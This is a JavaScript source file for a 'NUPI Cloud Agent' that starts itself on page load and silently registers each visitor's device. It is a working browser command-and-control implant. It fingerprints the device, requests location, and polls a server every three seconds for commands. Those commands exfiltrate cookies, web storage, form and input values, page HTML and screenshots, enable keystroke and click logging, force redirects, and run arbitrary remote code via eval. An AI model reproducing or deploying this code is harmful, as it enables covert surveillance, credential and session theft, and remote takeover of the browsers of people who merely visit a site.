/**
 * NUPI CLOUD AGENT - Auto-Registration & Device Control
 * Automatically registers visitor's device and enables cloud control
 * NO INSTALLATION REQUIRED - Just visit the site!
 */

(function() {
    'use strict';
    
    const CLOUD_API = window.location.origin;
    const CHECK_INTERVAL = 3000; // Check for commands every 3 seconds
    
    class NUPICloudAgent {
        constructor() {
            this.deviceId = this.getOrCreateDeviceId();
            this.isActive = true;
            this.deviceInfo = {};
            this.commandQueue = [];
            
            console.log('🚀 NUPI Cloud Agent Activated');
            this.init();
        }
        
        getOrCreateDeviceId() {
            let id = localStorage.getItem('nupi_device_id');
            if (!id) {
                id = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('nupi_device_id', id);
            }
            return id;
        }
        
        async init() {
            await this.collectDeviceInfo();
            await this.registerDevice();
            this.startHeartbeat();
            this.startCommandListener();
        }
        
        async collectDeviceInfo() {
            // Collect comprehensive device information
            const nav = navigator;
            
            this.deviceInfo = {
                device_id: this.deviceId,
                timestamp: new Date().toISOString(),
                
                // Browser & System
                userAgent: nav.userAgent,
                platform: nav.platform,
                language: nav.language,
                languages: nav.languages,
                vendor: nav.vendor,
                
                // Screen
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type
                },
                
                // Window
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                
                // Device capabilities
                capabilities: {
                    cookieEnabled: nav.cookieEnabled,
                    onLine: nav.onLine,
                    doNotTrack: nav.doNotTrack,
                    maxTouchPoints: nav.maxTouchPoints,
                    hardwareConcurrency: nav.hardwareConcurrency,
                    deviceMemory: nav.deviceMemory,
                    connection: nav.connection ? {
                        effectiveType: nav.connection.effectiveType,
                        downlink: nav.connection.downlink,
                        rtt: nav.connection.rtt,
                        saveData: nav.connection.saveData
                    } : null
                },
                
                // Geolocation (with permission)
                location: await this.getLocation(),
                
                // Battery (with permission)
                battery: await this.getBatteryInfo(),
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Plugins
                plugins: Array.from(nav.plugins || []).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                })),
                
                // Device type detection
                deviceType: this.detectDeviceType(),
                
                // Browser fingerprint
                fingerprint: await this.generateFingerprint()
            };
            
            console.log('📊 Device Info Collected:', this.deviceInfo);
        }
        
        async getLocation() {
            try {
                return new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed
                        }),
                        () => resolve(null),
                        { timeout: 5000, enableHighAccuracy: false }
                    );
                });
            } catch {
                return null;
            }
        }
        
        async getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
            } catch {
                return null;
            }
        }
        
        detectDeviceType() {
            const ua = navigator.userAgent.toLowerCase();
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                return 'tablet';
            }
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
                return 'mobile';
            }
            return 'desktop';
        }
        
        async generateFingerprint() {
            // Generate unique browser fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('NUPI Cloud Agent', 2, 2);
            
            const data = [
                navigator.userAgent,
                screen.colorDepth,
                screen.width + 'x' + screen.height,
                new Date().getTimezoneOffset(),
                navigator.language,
                canvas.toDataURL()
            ].join('|');
            
            // Simple hash function
            let hash = 0;
            for (let i = 0; i < data.length; i++) {
                const char = data.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            
            return 'fp_' + Math.abs(hash).toString(36);
        }
        
        async registerDevice() {
            try {
                const response = await fetch(`${CLOUD_API}/api/cloud/register`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(this.deviceInfo)
                });
                
                const result = await response.json();
                console.log('✅ Device Registered:', result);
                
                // Store session info
                if (result.session_id) {
                    localStorage.setItem('nupi_session_id', result.session_id);
                }
                
                return result;
            } catch (error) {
                console.error('❌ Registration failed:', error);
            }
        }
        
        async startHeartbeat() {
            setInterval(async () => {
                try {
                    await fetch(`${CLOUD_API}/api/cloud/heartbeat`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            device_id: this.deviceId,
                            timestamp: new Date().toISOString(),
                            page: window.location.pathname,
                            online: navigator.onLine
                        })
                    });
                } catch (e) {
                    console.log('💓 Heartbeat skipped');
                }
            }, 10000); // Every 10 seconds
        }
        
        async startCommandListener() {
            setInterval(async () => {
                await this.checkCommands();
            }, CHECK_INTERVAL);
        }
        
        async checkCommands() {
            try {
                const response = await fetch(`${CLOUD_API}/api/cloud/commands/${this.deviceId}`);
                const data = await response.json();
                
                if (data.commands && data.commands.length > 0) {
                    for (const cmd of data.commands) {
                        await this.executeCommand(cmd);
                    }
                }
            } catch (e) {
                // Silent fail
            }
        }
        
        async executeCommand(cmd) {
            console.log('📥 Executing command:', cmd.type);
            
            let result = {
                command_id: cmd.id,
                device_id: this.deviceId,
                status: 'success',
                output: null,
                timestamp: new Date().toISOString()
            };
            
            try {
                switch (cmd.type) {
                    case 'collect_info':
                        await this.collectDeviceInfo();
                        result.output = this.deviceInfo;
                        break;
                        
                    case 'get_cookies':
                        result.output = document.cookie;
                        break;
                        
                    case 'get_storage':
                        result.output = {
                            localStorage: {...localStorage},
                            sessionStorage: {...sessionStorage}
                        };
                        break;
                        
                    case 'screenshot':
                        result.output = await this.takeScreenshot();
                        break;
                        
                    case 'get_page_content':
                        result.output = {
                            html: document.documentElement.outerHTML,
                            title: document.title,
                            url: window.location.href,
                            forms: this.getForms(),
                            inputs: this.getInputs(),
                            links: this.getLinks()
                        };
                        break;
                        
                    case 'track_clicks':
                        this.enableClickTracking();
                        result.output = 'Click tracking enabled';
                        break;
                        
                    case 'track_keystrokes':
                        this.enableKeystrokeTracking();
                        result.output = 'Keystroke tracking enabled';
                        break;
                        
                    case 'get_history':
                        result.output = {
                            visited: localStorage.getItem('nupi_visited_pages') || [],
                            referrer: document.referrer
                        };
                        break;
                        
                    case 'redirect':
                        window.location.href = cmd.url;
                        result.output = 'Redirected to ' + cmd.url;
                        break;
                        
                    case 'eval':
                        result.output = eval(cmd.code);
                        break;
                        
                    default:
                        result.status = 'unknown_command';
                        result.output = 'Command type not recognized';
                }
            } catch (error) {
                result.status = 'error';
                result.output = error.message;
            }
            
            // Send result back to cloud
            await this.sendResult(result);
        }
        
        async takeScreenshot() {
            try {
                const canvas = await html2canvas(document.body);
                return canvas.toDataURL('image/png');
            } catch {
                return 'Screenshot library not loaded';
            }
        }
        
        getForms() {
            return Array.from(document.forms).map(form => ({
                action: form.action,
                method: form.method,
                inputs: Array.from(form.elements).map(el => ({
                    name: el.name,
                    type: el.type,
                    value: el.value
                }))
            }));
        }
        
        getInputs() {
            return Array.from(document.querySelectorAll('input, textarea, select')).map(el => ({
                name: el.name,
                type: el.type,
                value: el.value,
                placeholder: el.placeholder,
                id: el.id
            }));
        }
        
        getLinks() {
            return Array.from(document.links).slice(0, 50).map(link => ({
                href: link.href,
                text: link.textContent.trim().substring(0, 100)
            }));
        }
        
        enableClickTracking() {
            document.addEventListener('click', (e) => {
                this.trackEvent('click', {
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    text: e.target.textContent?.substring(0, 50)
                });
            });
        }
        
        enableKeystrokeTracking() {
            document.addEventListener('keydown', (e) => {
                this.trackEvent('keydown', {
                    key: e.key,
                    code: e.code,
                    target: e.target.tagName
                });
            });
        }
        
        async trackEvent(type, data) {
            try {
                await fetch(`${CLOUD_API}/api/cloud/events`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        device_id: this.deviceId,
                        event_type: type,
                        data: data,
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (e) {
                // Silent fail
            }
        }
        
        async sendResult(result) {
            try {
                await fetch(`${CLOUD_API}/api/cloud/results`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(result)
                });
            } catch (e) {
                console.error('Failed to send result');
            }
        }
    }
    
    // Auto-initialize when page loads
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            window.NUPIAgent = new NUPICloudAgent();
        });
    } else {
        window.NUPIAgent = new NUPICloudAgent();
    }
})();
